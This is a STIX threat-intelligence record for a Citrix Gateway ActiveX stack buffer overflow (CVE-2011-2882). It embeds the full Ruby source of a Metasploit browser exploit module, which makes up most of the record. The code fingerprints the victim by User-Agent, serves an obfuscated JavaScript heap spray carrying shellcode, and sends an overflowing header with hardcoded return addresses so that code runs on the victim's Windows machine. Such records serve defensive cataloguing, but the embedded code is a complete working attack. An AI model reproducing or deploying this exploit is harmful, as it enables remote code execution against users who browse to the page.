{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ab30a7e8-d067-4464-9316-f2421c65a8e2",
    "created": "2024-08-14T16:42:07.073395Z",
    "modified": "2024-08-14T16:42:07.073399Z",
    "name": "Citrix Gateway ActiveX Control Stack Based Buffer Overflow Vulnerability",
    "description": " This module exploits a stack based buffer overflow in the Citrix Gateway ActiveX control. Exploitation of this vulnerability requires user interaction. The victim must click a button in a dialog to begin a scan. This is typical interaction that users should be accustom to.  Exploitation results in code execution with the privileges of the user who browsed to the exploit page.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/citrix_gateway_actx.rb",
            "external_id": "citrix_gateway_actx.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-2882"
        },
        {
            "source_name": "reference",
            "url": "https://labs.idefense.com/verisign/intelligence/2009/vulnerabilities/display.php?id=929"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Citrix Gateway ActiveX Control Stack Based Buffer Overflow Vulnerability',\n      'Description'    => %q{\n          This module exploits a stack based buffer overflow in the Citrix Gateway\n        ActiveX control. Exploitation of this vulnerability requires user interaction.\n        The victim must click a button in a dialog to begin a scan. This is typical\n        interaction that users should be accustom to.\n\n          Exploitation results in code execution with the privileges of the user who\n        browsed to the exploit page.\n          },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Michal Trojnara', #Initial discovery\n          'bannedit',\n          'sinn3r',\n        ],\n      'References'     =>\n        [\n          [ 'CVE',  '2011-2882'],\n          [ 'OSVDB', '74191'   ],\n          [ 'URL', 'https://labs.idefense.com/verisign/intelligence/2009/vulnerabilities/display.php?id=929' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 500,\n          'BadChars' => \"\\x00\\x0a\\x0d\\x20\\x3b\\x81\\x83\\x88\\x90\",\n        },\n      'Platform' => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic', {} ],\n          [ 'IE 6 on Windows XP SP3', { 'Ret' => 0x0c0c0c0c } ],\n          [ 'IE 7 on Windows XP SP3', { 'Ret' => 0x0c0c0b0b } ],\n          [ 'IE 7 on Windows Vista',  { 'Ret' => 0x0c0c0b0b } ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2011-07-14', #Coordinated public disclosure according to iDefense\n      'DefaultTarget'  => 0))\n  end\n\n  def primer\n    hardcoded_uripath(\"/epaq\")\n  end\n\n  def exploit\n    @ocx = ::File.read(::File.join(Msf::Config.install_root, 'data', 'exploits', 'CVE-2011-2882', 'nsepa.ocx'), mode: 'rb')\n    super\n  end\n\n  def get_target(request)\n    t = target\n    agent = request.headers['User-Agent']\n\n    vprint_status(\"User-Agent: #{agent}\")\n\n    if t.name =~ /Automatic/\n      if agent =~ /NT 5\\.1/ and agent =~ /MSIE 6\\.0/\n        #Win XP + IE 6\n        t = targets[1]\n      elsif agent =~ /NT 5\\.1/ and agent =~ /MSIE 7\\.0/\n        #Win XP + IE 7\n        t = targets[2]\n      elsif agent =~ /NT 6\\.0/ and agent =~ /MSIE 7\\.0/\n        #Win Vista + IE7\n        t = targets[2]\n      elsif agent == 'nsepa'\n        #Citrix Access Gateway requesting /epaq\n        t = agent\n      else\n        #Target not supported\n        t = nil\n      end\n    end\n\n    return t, agent\n  end\n\n  def on_request_uri(cli, request)\n    @mytarget, agent = get_target(request) if @mytarget.nil?\n    vprint_status(\"Client requested: #{request.uri}.\")\n\n    #Target not supported, will not go on\n    if @mytarget.nil?\n      print_error(\"Target not supported: #{agent}\")\n      send_not_found(cli)\n      return\n    end\n\n    if request.uri.match(/nsepa/)\n      print_status(\"Sending nsepa.ocx\")\n      send_response(cli, @ocx, { 'Content-Type' => 'application/binary' })\n      return\n    end\n\n    if request.uri.match(/epaq/)\n      padding = rand_text_alpha(300)\n\n      csec = \"eepa_0_\"\n      csec << padding[0, 259]\n      csec << [@mytarget.ret].pack('V*')\n      csec << padding[0, 68]\n\n      result = rand_text_alpha(1000)\n      send_response(cli, rand_text_alpha(30), { 'CSEC' => csec, 'RESULT' => result } )\n      @mytarget = nil\n      return\n    end\n\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # payload in JS format\n    code = Rex::Text.to_unescape(payload.encoded)\n    randnop = rand_text_alpha(rand(100) + 1)\n    js_nops = Rex::Text.to_unescape(\"\\x0c\"*4)\n\n    #For debugging purposes: nops.substring(0,0x534) lands the payload exactly at 0x0c0c0c0c for IE6\n    spray = <<-JS\n    var heap_lib = new heapLib.ie(0x20000);\n    var code = unescape(\"#{code}\");\n    var #{randnop} = \"#{js_nops}\";\n    var nops = unescape(#{randnop});\n\n    while (nops.length < 0x1000) nops += nops;\n    var offset = nops.substring(0, 0x550);\n    var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);\n\n    while (shellcode.length < 0x20000) shellcode += shellcode;\n    var block = shellcode.substring(0, (0x10000-6)/2);\n\n    heap_lib.gc();\n\n    for (var i = 0; i < 0x6000; i++) {\n      heap_lib.alloc(block);\n    }\n    JS\n\n    spray = heaplib(spray, {:noobfu => true})\n    spray = ::Rex::Exploitation::JSObfu.new(spray)\n    spray.obfuscate(memory_sensitive: true)\n\n    load = %Q|\n    var d=document.getElementById(\"nsepadiv\");\n    if(d) {\n      d.innerHTML=\n      '<object id=\"nsepa\" classid=\"CLSID:181BCAB2-C89B-4E4B-9E6B-59FA67A426B5\" '+\n      'width=1px height=1px codebase=\"#{get_resource}/epa/nsepa.ocx#version=8,0,59,1\">' +\n      '<param name=\"cookie\" value=\"0123456789abcdef0123456789abcdef\">'+\n      '<param name=\"location\" value=\"'+document.location+'\">'+\n      '<param name=\"trace\" value=\"DEBUG\">'+\n      '<param name=\"vip\" value=\"255.255.255.255\">'+\n      '</object>';\n    } else {\n      alert('Internal Error');\n    }\n|\n    # the ret slide gets executed via call [esi+45b]\n    html = <<-EOS\n    <html>\n    <body>\n    <div id=\"nsepadiv\"></div>\n    <script language=\"javascript\">\n    #{spray}\n    #{load}\n    </script>\n    </body>\n    </html>\n    EOS\n\n    html = html.gsub(/^ {4}/, '')\n\n    print_status(\"Sending #{self.name} HTML\")\n    send_response(cli, html, { 'Content-Type' => 'text/html' })\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-07-14, #Coordinated public disclosure according to iDefense",
    "x_mitre_platforms": [
        "win'"
    ]
}